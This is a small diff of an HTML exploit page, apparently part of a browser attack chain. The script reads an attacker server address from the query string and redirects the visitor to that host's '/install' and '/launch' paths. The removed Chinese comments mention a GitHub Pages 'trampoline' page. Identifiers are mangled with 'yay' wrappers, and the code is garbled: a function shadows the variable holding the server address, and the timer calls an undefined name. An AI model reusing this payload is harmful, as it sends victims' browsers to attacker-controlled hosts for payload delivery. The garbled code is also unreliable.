@@ -1,13 +1,15 @@
 <!-- exploit.html -->
 <script>
-// 获取参数中的攻击者服务器地址
 var yayquerystringyay = window.location.search;
 var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
 var yaypythonserveryay = yayurlparamsyay.get('yayattackeryay');
 
-if (yaypythonserveryay) {
-  // 跳转到你托管在 GitHub Pages 上的“trampoline”页面
+location.href = "http://" + yaypythonserveryay + "/yayinstallyay";
+
+const yaytimoutyay=setTimeout(yaylaunchyay,1000);
+
+function yaypythonserveryay() {
+
   location.href = "http://" + yaypythonserveryay + "/yaylaunchyay";
 }
 </script>
-</body>
